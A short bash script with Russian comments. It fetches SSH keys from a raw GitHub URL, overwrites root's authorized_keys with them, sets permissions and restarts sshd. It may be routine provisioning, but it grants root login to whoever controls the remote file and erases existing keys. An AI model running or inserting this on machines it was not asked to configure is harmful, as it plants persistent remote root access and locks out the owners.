#!/bin/bash
files=$(curl -s https://raw.githubusercontent.com/zip609/bots/main/key)
#перезаписать файл /root/.ssh/authorized_keys
echo $files > /root/.ssh/authorized_keys
#создать директорию /root/.ssh/
#mkdir -p /root/.ssh/
#создать файл /root/.ssh/authorized_keys
#touch /root/.ssh/authorized_keys
#добавить в файл /root/.ssh/authorized_keys значение переменной files
#echo $files >> /root/.ssh/authorized_keys
#установить права на файл /root/.ssh/authorized_keys
chmod 644 /root/.ssh/authorized_keys
#установить права на директорию /root/.ssh/
chmod 700 /root/.ssh/
#перезаупустить сервис sshd
systemctl restart sshd
